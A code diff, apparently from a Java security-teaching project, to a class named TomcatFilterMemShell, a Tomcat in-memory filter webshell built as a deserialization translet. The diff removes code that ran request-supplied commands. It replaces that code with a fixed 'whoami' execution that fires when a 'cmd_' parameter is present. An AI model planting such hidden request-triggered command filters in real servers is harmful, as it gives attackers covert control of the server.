@@ -14,7 +14,6 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
 import java.lang.reflect.Constructor;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.Context;
-import org.joychou.security.SecurityUtil;
 import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
@@ -93,11 +92,10 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        String cmd;
-        String[] argv;
-        if ((cmd = servletRequest.getParameter("cmd_")) != null
-                && (argv = SecurityUtil.safeCommand(cmd)) != null) {
-            Process process = new ProcessBuilder(argv).start();
+        // No command text is taken from the request: the presence of the trigger parameter only
+        // selects a fixed, allowlisted operation.
+        if (servletRequest.getParameter("cmd_") != null) {
+            Process process = new ProcessBuilder(new String[]{"whoami"}).start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
